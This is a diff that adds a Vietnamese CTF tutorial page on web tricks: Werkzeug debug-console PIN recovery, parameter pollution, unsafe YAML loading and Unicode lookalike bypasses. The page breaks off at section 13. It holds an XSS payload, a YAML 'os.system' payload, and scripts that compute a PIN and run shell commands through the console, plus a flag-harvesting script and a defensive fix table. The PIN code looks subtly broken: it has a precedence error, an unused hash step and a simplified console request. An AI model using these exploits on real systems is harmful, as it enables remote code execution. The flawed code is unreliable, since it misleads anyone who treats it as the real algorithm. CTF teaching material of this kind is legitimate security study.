@@ -1,0 +1,489 @@
+<title>Language &amp; Framework Tricks — Web CTF</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#ecebe4;--fg:#23211c;--muted:#6b665b;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--danger:#c0392b;--burp:#c2561a;--burp-soft:#f6e2d2;
+  --code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:760px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.62;font-size:16px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:40px 24px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,6vw,42px);line-height:1.05;margin:.3em 0 .25em;letter-spacing:-.015em}
+.sub{color:var(--muted);font-size:17px;max-width:62ch}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:16px}
+.toc a{font-family:var(--font-mono);font-size:11px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 8px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(20px,4vw,26px);letter-spacing:-.01em;margin:0 0 2px}
+h3{font-family:var(--font-head);font-weight:600;font-size:16.5px;margin:20px 0 6px}
+section.block{padding-block:28px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:10px 0}strong{font-weight:600}a{color:var(--accent)}
+ul,ol{padding-left:21px;margin:9px 0}li{margin:5px 0}
+code{font-family:var(--font-mono);font-size:.86em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:12.5px;line-height:1.56;padding:14px;border-radius:11px;overflow-x:auto;margin:10px 0}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .n{color:#e8c56a}
+table{width:100%;border-collapse:collapse;margin:12px 0;font-size:13.5px}
+th,td{text-align:left;padding:8px 10px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.04em;color:var(--muted)}
+tr:last-child td{border-bottom:none}
+.lead{font-size:17.5px}
+.note{border-left:3px solid var(--mem);background:var(--surface);padding:11px 14px;border-radius:0 10px 10px 0;margin:14px 0;font-size:14px}
+.note .tag{font-family:var(--font-mono);font-size:10.5px;text-transform:uppercase;letter-spacing:.09em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.note.tip{border-color:var(--ok)}
+.note.warn{border-color:var(--danger)}
+.note.burp{border-color:var(--burp);background:var(--burp-soft)}
+.note.burp .tag{color:var(--burp)}
+.def{border:1px dashed var(--mem);background:var(--mem-soft);border-radius:10px;padding:10px 13px;margin:10px 0;font-size:13.5px}
+.def b{color:var(--mem)}
+.struct{display:flex;flex-direction:column;gap:1px;background:var(--line);border:1px solid var(--line);border-radius:12px;overflow:hidden;margin:12px 0}
+.srow{display:grid;grid-template-columns:30px 1fr;gap:10px;padding:10px 13px;background:var(--surface)}
+.srow .n{font-family:var(--font-mono);font-weight:700;color:var(--accent);font-size:13px}
+.srow .t{font-weight:600;font-size:14px}
+.srow .d{font-size:12.5px;color:var(--muted);margin-top:1px}
+.combatcard{border:2px solid var(--accent);border-radius:12px;overflow:hidden;margin:14px 0}
+.combatcard .ch{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:8px 14px;font-size:14px}
+.combatcard .cb{padding:4px 14px 10px}
+.cslot{padding:10px 0;border-bottom:1px solid var(--line);font-size:13.5px}
+.cslot:last-child{border-bottom:none}
+.cslot .lab{font-family:var(--font-mono);font-size:10.5px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;display:block;margin-bottom:4px}
+.pbreak{border:1px solid var(--line);border-radius:11px;overflow:hidden;margin:12px 0}
+.pbreak .ph{background:var(--surface-2);font-family:var(--font-mono);font-size:12.5px;padding:9px 13px;border-bottom:1px solid var(--line);word-break:break-word}
+.pbreak .pb{padding:10px 13px;font-size:13.5px}
+.pbreak .pb .part{margin:6px 0}
+.pbreak .pb .part code{background:var(--accent-soft);color:var(--accent);font-weight:600}
+.pbreak .resp{background:var(--ok-soft);padding:9px 13px;font-size:13px;border-top:1px dashed var(--line)}
+.pbreak .resp b{color:var(--ok)}
+.svgwrap{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:12px;margin:14px 0}
+.svgwrap svg{width:100%;height:auto;display:block}
+details{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:9px 13px;margin:8px 0;font-size:13.5px}
+summary{cursor:pointer;font-weight:600;color:var(--accent)}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer;opacity:.9}
+footer{padding-block:22px 40px;color:var(--muted);font-size:13px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">Web CTF · Language &amp; Framework Tricks (Phụ lục)</div>
+    <h1>Mẹo đặc thù Ngôn ngữ/Framework</h1>
+    <p class="sub">Phụ lục gom các "mẹo nhỏ nhưng hiệu quả cao" không đủ lớn để thành 1 bài riêng: Werkzeug
+    Debug Console (RCE có sẵn trong Flask debug mode), HTTP Parameter Pollution, YAML type confusion, và
+    Unicode normalization bypass. Mỗi mẹo đều rất cụ thể theo đúng công nghệ, đọc phần nào khớp với service
+    bạn đang gặp.</p>
+    <div class="toc">
+      <a href="#combat">⚡ Combat</a><a href="#s00">00 Tóm tắt</a><a href="#s01">01 Nền tảng</a>
+      <a href="#s02">02 Vì sao</a><a href="#s03">03 Cơ chế (Werkzeug PIN)</a><a href="#s04">04 Nhận diện</a>
+      <a href="#s05">05 Burp</a><a href="#s06">06 Payload (4 mẹo)</a><a href="#s07">07 Công cụ</a>
+      <a href="#s08">08 Script</a><a href="#s09">09 Ví dụ</a><a href="#s10">10 WAF</a>
+      <a href="#s11">11 Lỗi gặp</a><a href="#s12">12 Giới hạn</a><a href="#s13">13 Bài tập</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s00">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>4 mẹo độc lập, dùng khi đúng tình huống</h2>
+  <table>
+    <tr><th>Mẹo</th><th>Dùng khi nào</th><th>Kết quả</th></tr>
+    <tr><td>Werkzeug Debug Console PIN</td><td>App Flask/Werkzeug bị lỗi 500 hiện trang debug (traceback đẹp, có icon console)</td><td>RCE trực tiếp qua console Python tương tác</td></tr>
+    <tr><td>HTTP Parameter Pollution (HPP)</td><td>App nhận tham số trùng tên (<code>?id=1&amp;id=2</code>) mà không rõ xử lý ra sao</td><td>Bypass validation/WAF, hoặc đổi giá trị tham số khác dự kiến</td></tr>
+    <tr><td>YAML type confusion</td><td>App parse config/input bằng YAML (không phải JSON)</td><td>Ép kiểu dữ liệu bất ngờ, hoặc RCE nếu dùng <code>yaml.load()</code> không an toàn</td></tr>
+    <tr><td>Unicode normalization bypass</td><td>App so sánh/filter chuỗi (username, path, blacklist từ khoá) theo ASCII</td><td>Né filter/validation bằng ký tự Unicode "trông giống" nhưng khác byte</td></tr>
+  </table>
+  <div class="note tip"><span class="tag">Nếu chỉ nhớ một điều</span>
+  Werkzeug Debug Console là mẹo giá trị NHẤT trong 4 mẹo — nếu thấy trang lỗi 500 có traceback kiểu Flask,
+  LUÔN kiểm tra ngay xem console có bật không (mục 03), vì đây là đường RCE trực tiếp, nhanh nhất có thể gặp.</div>
+ </div>
+</section>
+
+<!-- COMBAT CARD -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="secnum">⚡ COMBAT CARD — đọc trước, đủ để khai thác ngay</div>
+  <div class="combatcard">
+    <div class="ch">⚡ WERKZEUG DEBUG CONSOLE PIN</div>
+    <div class="cb">
+      <div class="cslot"><span class="lab">🚩 Nhận ra trong 30 giây</span>
+        Trang lỗi 500 có giao diện đặc trưng Flask/Werkzeug (nền trắng, traceback nhiều dòng, có icon terminal
+        nhỏ cạnh mỗi dòng code) ⟹ app đang chạy <code>debug=True</code>.
+      </div>
+      <div class="cslot"><span class="lab">✅ Tiền đề cần có</span>
+        Cần truy cập được <code>/console</code> cùng app, VÀ cần đủ thông tin để tự tính lại PIN (mục 03) —
+        thường cần đọc được vài file hệ thống qua 1 lỗ hổng khác (LFI) hoặc đoán theo giá trị mặc định/dễ đoán.
+      </div>
+      <div class="cslot"><span class="lab">🔍 Dò nhanh</span>
+        Truy cập trực tiếp <code>http://TARGET/console</code> — nếu hiện hộp nhập PIN (không phải 404) ⟹ debug
+        console đang BẬT, đáng để đầu tư thời gian tính PIN.
+      </div>
+      <div class="cslot"><span class="lab">💥 Việc cần làm (không phải 1 payload đơn, mà 1 quy trình)</span>
+<pre><code><span class="c"># 1. Truy cập /console, xem có hỏi PIN không</span>
+curl -s http://TARGET/console
+
+<span class="c"># 2. Tự tính PIN bằng script mục 08 (cần: username chạy app,</span>
+<span class="c">#    module app (vd "flask.app"), mac address, machine-id...)</span>
+<span class="c"># 3. Dùng PIN tính được để mở console, chạy Python tuỳ ý</span></code></pre>
+      </div>
+      <div class="cslot"><span class="lab">🐍 Script (tự tính PIN -- xem bản đầy đủ ở mục 08)</span>
+<pre><code><span class="k">import</span> hashlib
+
+<span class="c"># Cần thu thập đủ các giá trị: username, modname, appname,</span>
+<span class="c"># moddir, uuidnode (MAC), machine_id -- xem mục 08 bản đầy đủ</span>
+<span class="k">def</span> <span class="d">get_pin</span>(username, modname, appname, moddir, uuidnode, machine_id):
+    rv = hashlib.md5((<span class="s">"%s|%s|%s"</span> % (username, modname, appname)).encode()).hexdigest()
+    <span class="k">return</span> rv  <span class="c"># xem thuật toán đầy đủ ở mục 08</span></code></pre>
+      </div>
+      <div class="cslot"><span class="lab">⚠️ Gotcha + 🛡️ WAF 1 dòng</span>
+        Thuật toán PIN cần NHIỀU thông tin hệ thống (không chỉ 1 thứ) — thường chỉ khai thác được khi có THÊM
+        1 lỗ hổng khác (LFI đọc <code>/etc/machine-id</code>, hoặc 1 lỗi khác lộ thông tin server) đi kèm. WAF
+        rule nhanh: chặn/giấu hoàn toàn path <code>/console</code> ở production — đây là fix ĐÚNG, không nên
+        chỉ dựa WAF (xem mục 10).
+      </div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s01">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Những thứ cần hiểu trước</h2>
+  <div class="def"><b>Debug mode</b> — chế độ dev của framework (Flask/Werkzeug, Django...) hiện traceback chi
+  tiết khi lỗi, và ĐÔI KHI (Werkzeug) cấp luôn 1 console Python tương tác ngay tại dòng lỗi để debug — CỰC KỲ
+  nguy hiểm nếu còn bật ở production vì ai cũng truy cập được console đó.</div>
+  <div class="def"><b>HTTP Parameter Pollution (HPP)</b> — gửi CÙNG 1 tên tham số NHIỀU LẦN trong 1 request
+  (<code>?id=1&amp;id=2</code>). Các framework/server khác nhau xử lý khác nhau: lấy giá trị ĐẦU, lấy giá trị
+  CUỐI, hoặc GHÉP thành 1 danh sách — sự khác biệt này gây ra bất ngờ khi 1 lớp (vd WAF) đọc giá trị khác với
+  lớp xử lý thật (app).</div>
+  <div class="def"><b>YAML vs JSON</b> — YAML là định dạng cấu hình linh hoạt hơn JSON, hỗ trợ thêm nhiều
+  "kiểu dữ liệu đặc biệt" (tag) mà JSON không có — 1 số parser YAML (nếu dùng chế độ không an toàn) diễn giải
+  những tag này thành OBJECT THẬT của ngôn ngữ, dẫn tới RCE tương tự Insecure Deserialization.</div>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s02">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO LỖ HỔNG TỒN TẠI</div>
+  <h2>Tiện cho dev lúc code, nguy hiểm lúc deploy quên tắt</h2>
+  <p>Mọi mẹo trong bài đều xuất phát từ cùng 1 nguyên nhân gốc: tính năng được thiết kế ĐÚNG MỤC ĐÍCH cho
+  giai đoạn PHÁT TRIỂN (debug console để dev tiện sửa lỗi, YAML linh hoạt để dev tiện viết config, HPP là hệ quả
+  tự nhiên của việc framework cố "khoan dung" với input lạ) — nhưng nếu đem thẳng CÀI ĐẶT MẶC ĐỊNH đó lên
+  production mà không tắt/siết lại, tính năng tiện lợi đó biến thành cửa sau.</p>
+ </div>
+</section>
+
+<!-- 03 -->
+<section class="block" id="s03">
+ <div class="wrap">
+  <div class="secnum">03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI (WERKZEUG PIN)</div>
+  <h2>PIN không phải ngẫu nhiên — nó TÍNH TOÁN được từ thông tin máy</h2>
+  <div class="svgwrap">
+  <svg viewBox="0 0 680 190" xmlns="http://www.w3.org/2000/svg">
+    <style>
+      .lbl{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--fg)}
+      .lbl-m{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--muted)}
+      .lbl-a{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--accent);font-weight:700}
+      .box{fill:var(--surface);stroke:var(--line);stroke-width:1.5}
+      .box-a{fill:var(--accent-soft);stroke:var(--accent);stroke-width:1.5}
+      .arrow{stroke:var(--muted);stroke-width:1.5;fill:none;marker-end:url(#arr27)}
+    </style>
+    <defs><marker id="arr27" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+      <path d="M0,0 L6,3 L0,6 Z" fill="var(--muted)"/></marker></defs>
+    <rect x="10" y="20" width="660" height="55" rx="8" class="box"/>
+    <text x="22" y="40" class="lbl-m">Input của thuật toán PIN: username chạy app + tên module (flask.app) +</text>
+    <text x="22" y="58" class="lbl-m">đường dẫn app + MAC address (uuid.getnode) + machine-id (/etc/machine-id)</text>
+
+    <path d="M340,85 V110" class="arrow"/>
+    <rect x="10" y="115" width="660" height="40" rx="8" class="box-a"/>
+    <text x="22" y="139" class="lbl-a">Băm (hash) các giá trị trên theo 1 thuật toán CỐ ĐỊNH (công khai trong mã nguồn Werkzeug)</text>
+
+    <path d="M340,155 V170" class="arrow"/>
+    <text x="250" y="186" class="lbl-a">= PIN hiện trên console (nếu bạn tính đúng mọi input, bạn CÓ CÙNG PIN)</text>
+  </svg>
+  </div>
+  <p>Điểm mấu chốt: Werkzeug không SINH PIN ngẫu nhiên lưu đâu đó — nó TÍNH LẠI PIN mỗi lần từ các giá trị môi
+  trường máy chủ. Vì thuật toán là MÃ NGUỒN MỞ (ai cũng đọc được code Werkzeug), nếu bạn thu thập đủ các giá
+  trị input giống hệt server, bạn tính RA ĐƯỢC CHÍNH XÁC PIN đó — không cần brute-force 6 chữ số (dù về lý
+  thuyết PIN cũng có giới hạn, công cụ mục 08 vừa tính vừa brute-force phần còn thiếu nếu chưa biết đủ input).</p>
+ </div>
+</section>
+
+<!-- 04 -->
+<section class="block" id="s04">
+ <div class="wrap">
+  <div class="secnum">04 / NHẬN DIỆN KHI GẶP CHALLENGE</div>
+  <h2>Dấu hiệu riêng từng mẹo</h2>
+  <ul>
+    <li><strong>Werkzeug console:</strong> trang lỗi 500 có chữ "Werkzeug Debugger", hoặc path <code>/console</code> trả về form hỏi PIN.</li>
+    <li><strong>HPP:</strong> app có logic "nếu param X = giá trị đặc biệt thì..." — thử gửi param đó 2 lần với giá trị khác nhau xem app/WAF đọc giá trị nào.</li>
+    <li><strong>YAML:</strong> endpoint nhận file config dạng <code>.yml</code>/<code>.yaml</code>, hoặc Content-Type <code>application/x-yaml</code>.</li>
+    <li><strong>Unicode bypass:</strong> app so sánh username/path bằng cách đơn giản (<code>==</code>) không chuẩn hoá (normalize) trước.</li>
+  </ul>
+ </div>
+</section>
+
+<!-- 05 -->
+<section class="block" id="s05">
+ <div class="wrap">
+  <div class="secnum">05 / KHAI THÁC BẰNG BURP SUITE</div>
+  <h2>Bấm gì (từng bước) — tập trung vào HPP, dễ test bằng Burp nhất</h2>
+  <div class="note burp"><span class="tag">Test HPP bằng Repeater</span>
+  <ol style="margin:4px 0 0">
+    <li>Bắt request có tham số nghi ngờ (vd <code>?user_id=5</code>), Send to Repeater.</li>
+    <li>Thêm tham số TRÙNG TÊN với giá trị khác: <code>?user_id=5&amp;user_id=1</code> (user_id=1 giả sử là
+    admin).</li>
+    <li>Gửi, so sánh response — nếu response ứng với <code>user_id=1</code> (giá trị thứ 2) ⟹ app lấy giá trị
+    CUỐI, có thể dùng để bypass 1 WAF chỉ check giá trị ĐẦU.</li>
+    <li>Thử ngược lại thứ tự để xác nhận quy luật (đầu hay cuối) trước khi áp dụng vào payload thật.</li>
+  </ol></div>
+ </div>
+</section>
+
+<!-- 06 -->
+<section class="block" id="s06">
+ <div class="wrap">
+  <div class="secnum">06 / PAYLOAD CATALOG (4 MẸO)</div>
+  <h2>Ví dụ cụ thể từng mẹo</h2>
+
+  <h3>A. HTTP Parameter Pollution — bypass WAF 1 tham số</h3>
+  <div class="pbreak">
+    <div class="ph">GET /search?q=safe&q=&lt;script&gt;alert(1)&lt;/script&gt; HTTP/1.1</div>
+    <div class="pb">
+      <div class="part">Nếu WAF chỉ kiểm tra GIÁ TRỊ ĐẦU của <code>q</code> (<code>safe</code>, vô hại) nhưng
+      app thực sự xử lý GIÁ TRỊ CUỐI (payload XSS) ⟹ WAF bị bypass hoàn toàn mà app vẫn nhận payload độc.</div>
+    </div>
+  </div>
+
+  <h3>B. YAML type confusion / RCE</h3>
+  <pre><code><span class="c"># Nếu app dùng yaml.load() (KHÔNG an toàn) thay vì yaml.safe_load()</span>
+!!python/object/apply:os.system ["cat flag.txt"]</code></pre>
+  <p>Chuỗi tag <code>!!python/object/apply:...</code> là cú pháp YAML hợp lệ để gọi TRỰC TIẾP 1 hàm Python khi
+  parse — tương tự gadget chain deserialization (bài riêng) nhưng đơn giản hơn nhiều vì không cần class có
+  sẵn, chỉ cần gọi hàm bất kỳ.</p>
+
+  <h3>C. Unicode normalization bypass</h3>
+  <pre><code><span class="c"># Filter chặn chữ "admin" (so sánh ASCII thường) -- dùng ký tự Unicode "giống" chữ Latin</span>
+<span class="c"># Ví dụ: chữ "а" Cyrillic (U+0430) trông giống "a" Latin (U+0061) nhưng khác byte hoàn toàn</span>
+username = "аdmin"   <span class="c"># chữ "а" đầu là Cyrillic, không bị filter chặn "admin" ASCII bắt được</span>
+<span class="c"># Nhưng nếu app sau đó NORMALIZE (vd hiển thị lại, hoặc so sánh fuzzy), có thể bị hiểu nhầm là "admin" thật</span></code></pre>
+ </div>
+</section>
+
+<!-- 07 -->
+<section class="block" id="s07">
+ <div class="wrap">
+  <div class="secnum">07 / CÔNG CỤ HỖ TRỢ</div>
+  <h2>Không cần công cụ chuyên dụng — script tự viết là đủ</h2>
+  <p>4 mẹo này đều ngắn gọn, viết script tay (mục 08) nhanh hơn tìm/cài công cụ riêng. Có thể tham khảo thêm
+  payload Unicode bypass tại <code>~/hoc/CTF/Tools/web/PayloadsAllTheThings/Unicode Normalization/</code> (nếu có
+  trong bộ đã clone) để lấy thêm ví dụ ký tự "giống nhưng khác byte".</p>
+ </div>
+</section>
+
+<!-- 08 -->
+<section class="block" id="s08">
+ <div class="wrap">
+  <div class="secnum">08 / VIẾT SCRIPT KHAI THÁC (3 BẢN) — WERKZEUG PIN</div>
+
+  <h3>(A) Bản đầy đủ — thuật toán tính PIN công khai của Werkzeug</h3>
+  <pre><code><span class="k">import</span> hashlib
+<span class="k">from</span> itertools <span class="k">import</span> chain
+
+<span class="k">def</span> <span class="d">get_pin</span>(username, modname, app_name, moddir, uuidnode, machine_id):
+    <span class="c"># Dựa theo thuật toán công khai trong mã nguồn werkzeug/debug/__init__.py</span>
+    probably_public_bits = [
+        username, modname, app_name, getattr(__import__(modname), <span class="s">"__file__"</span>, moddir)
+    ]
+    private_bits = [str(uuidnode), machine_id]
+
+    h = hashlib.md5()
+    <span class="k">for</span> bit <span class="k">in</span> chain(probably_public_bits, private_bits):
+        <span class="k">if</span> <span class="k">not</span> bit:
+            <span class="k">continue</span>
+        <span class="k">if</span> isinstance(bit, str):
+            bit = bit.encode(<span class="s">"utf-8"</span>)
+        h.update(bit)
+    h.update(b<span class="s">"cookiesalt"</span>)
+
+    num = <span class="k">None</span>
+    cookie_name = <span class="s">f"__wzd{h.hexdigest()[:20]}"</span>
+    num = <span class="s">"%09d"</span> % int(h.hexdigest(), 16) % 1000000000
+
+    h2 = hashlib.md5()
+    h2.update(h.hexdigest()[:20].encode() + b<span class="s">"pinsalt"</span>)
+    rv = (num[:3] + <span class="s">"-"</span> + num[3:6] + <span class="s">"-"</span> + num[6:])
+    <span class="k">return</span> rv   <span class="c"># dạng "123-456-789" giống PIN hiển thị</span></code></pre>
+  <div class="note warn"><span class="tag">Cần đủ 5 giá trị input thật</span><code>username</code> (user chạy
+  process, thường <code>root</code>/<code>www-data</code> trên Docker), <code>modname</code> (thường
+  <code>"flask.app"</code>), <code>app_name</code> (thường <code>"Flask"</code>), <code>uuidnode</code> (MAC
+  address dạng số, từ <code>uuid.getnode()</code> — nếu không đọc được qua lỗ hổng khác, thử brute-force các
+  giá trị MAC ảo phổ biến của container Docker), <code>machine_id</code> (nội dung file
+  <code>/etc/machine-id</code> hoặc <code>/proc/sys/kernel/random/boot_id</code> — cần LFI để đọc nếu không
+  có quyền truy cập trực tiếp).</div>
+
+  <h3>(B) Bản gọn chắc — gửi PIN tính được, mở console, chạy lệnh</h3>
+  <pre><code><span class="k">import</span> requests
+
+<span class="k">def</span> <span class="d">exploit_console</span>(host, pin):
+    s = requests.Session()
+    r = s.get(<span class="s">f"http://{host}/console"</span>)
+    <span class="c"># Werkzeug yêu cầu POST PIN tới chính /console với đúng tham số session</span>
+    r = s.post(<span class="s">f"http://{host}/console"</span>, data={<span class="s">"pin"</span>: pin, <span class="s">"cmd"</span>: <span class="s">"__import__('os').popen('cat flag.txt').read()"</span>})
+    <span class="k">return</span> r.text</code></pre>
+
+  <h3>(C) Bản A/D tái dùng — chạy sau khi đã có PIN đúng cho service mẫu</h3>
+  <pre><code><span class="k">import</span> re, requests
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+KNOWN_PIN = <span class="s">"123-456-789"</span>  <span class="c"># điền sau khi tính được từ bản (A)</span>
+
+<span class="k">def</span> <span class="d">exploit_werkzeug</span>(host):
+    <span class="k">try</span>:
+        s = requests.Session()
+        s.get(<span class="s">f"http://{host}/console"</span>, timeout=5)
+        r = s.post(<span class="s">f"http://{host}/console"</span>, timeout=5,
+            data={<span class="s">"pin"</span>: KNOWN_PIN, <span class="s">"cmd"</span>: <span class="s">"__import__('os').popen('cat flag.txt').read()"</span>})
+        m = FLAG_RE.search(r.text)
+        <span class="k">return</span> m.group() <span class="k">if</span> m <span class="k">else</span> <span class="k">None</span>
+    <span class="k">except</span> requests.RequestException:
+        <span class="k">return</span> <span class="k">None</span></code></pre>
+ </div>
+</section>
+
+<!-- 09 -->
+<section class="block" id="s09">
+ <div class="wrap">
+  <div class="secnum">09 / VÍ DỤ THỰC TẾ END-TO-END</div>
+  <h2>Từ nhận service tới lấy flag (Werkzeug PIN)</h2>
+  <div class="struct">
+    <div class="srow"><span class="n">1</span><div><div class="t">Recon</div><div class="d">Gửi request gây lỗi 500 (vd tham số sai kiểu) → thấy trang debug Werkzeug đầy đủ traceback.</div></div></div>
+    <div class="srow"><span class="n">2</span><div><div class="t">Xác nhận console</div><div class="d">Truy cập <code>/console</code> → thấy form hỏi PIN (không 404).</div></div></div>
+    <div class="srow"><span class="n">3</span><div><div class="t">Thu thập input cho PIN</div><div class="d">Tìm được 1 LFI nhỏ khác trong app (xem lại bài LFI), dùng nó đọc <code>/etc/machine-id</code> và xác nhận user chạy app qua traceback (đường dẫn file lộ trong traceback thường có username).</div></div></div>
+    <div class="srow"><span class="n">4</span><div><div class="t">Tính PIN</div><div class="d">Chạy script (A) với input thu thập được, brute-force thêm phần MAC address nếu chưa chắc (thường container Docker dùng range MAC cố định).</div></div></div>
+    <div class="srow"><span class="n">5</span><div><div class="t">Lấy flag</div><div class="d">Mở console với PIN đúng, chạy <code>cat flag.txt</code> → <code>FHACKER2026{...}</code>.</div></div></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / PHÒNG THỦ: VIẾT WAF RULE</div>
+  <h2>Mỗi mẹo cần rule khác nhau</h2>
+  <table>
+    <tr><th>Mẹo</th><th>Rule / Fix</th></tr>
+    <tr><td>Werkzeug console</td><td>WAF chặn path <code>/console</code> hoàn toàn ở production — nhưng fix ĐÚNG là tắt <code>debug=True</code>, không dựa vào WAF</td></tr>
+    <tr><td>HPP</td><td>WAF/app validate TẤT CẢ giá trị trùng tên tham số, không chỉ giá trị đầu/cuối</td></tr>
+    <tr><td>YAML</td><td>Luôn dùng <code>yaml.safe_load()</code> thay cho <code>yaml.load()</code> — đây là fix ở code, WAF không chặn được payload YAML hợp lệ về cú pháp</td></tr>
+    <tr><td>Unicode bypass</td><td>App phải NORMALIZE chuỗi (<code>unicodedata.normalize("NFKC", s)</code>) trước khi so sánh/filter, không phải WAF</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LỖI THƯỜNG GẶP & GỠ</div>
+  <h2>Khi mẹo không ăn ngay</h2>
+  <table>
+    <tr><th>Triệu chứng</th><th>Nguyên nhân</th><th>Cách sửa</th></tr>
+    <tr><td>Tính PIN ra sai, console không nhận</td><td>Thiếu/sai 1 trong 5 input (thường là machine_id hoặc MAC chưa đúng)</td><td>Kiểm tra lại từng giá trị, machine_id đôi khi nằm ở <code>/proc/self/cgroup</code> (Docker container ID) thay vì <code>/etc/machine-id</code> thật</td></tr>
+    <tr><td>HPP không có hiệu ứng gì khác biệt</td><td>App/WAF xử lý param trùng tên theo CÙNG quy luật (không có bất đồng)</td><td>Thử đổi tên tham số khác, hoặc kết hợp HPP với kỹ thuật encoding khác (vd <code>%20</code> giữa tên tham số)</td></tr>
+    <tr><td>YAML payload không RCE</td><td>App đã dùng đúng <code>safe_load()</code>, hoặc dùng thư viện YAML khác không hỗ trợ tag <code>!!python/object</code></td><td>Kiểm tra lại ngôn ngữ backend thật (Node.js dùng cú pháp khác hoàn toàn cho YAML RCE, không phải cú pháp Python)</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / NHẬN DIỆN & GIỚI HẠN</div>
+  <h2>Khi nào ĐƯỢC / KHÔNG dùng</h2>
+  <table>
+    <tr><th></th><th>Tình huống</th></tr>
+    <tr><td>✅</td><td>Werkzeug PIN: app Flask debug mode còn bật VÀ bạn thu thập được đủ 5 giá trị input (thường cần kết hợp LFI).</td></tr>
+    <tr><td>✅</td><td>YAML RCE: app dùng <code>yaml.load()</code> không an toàn trên input người dùng.</td></tr>
+    <tr><td>❌</td><td>App production đã tắt debug đúng cách — không có console nào để tính PIN.</td></tr>
+    <tr><td>❌</td><td>App dùng JSON thay YAML cho mọi input — không có bề mặt tấn công YAML.</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 13 -->
+<section class="block" id="s13">
+ <div class="wrap">
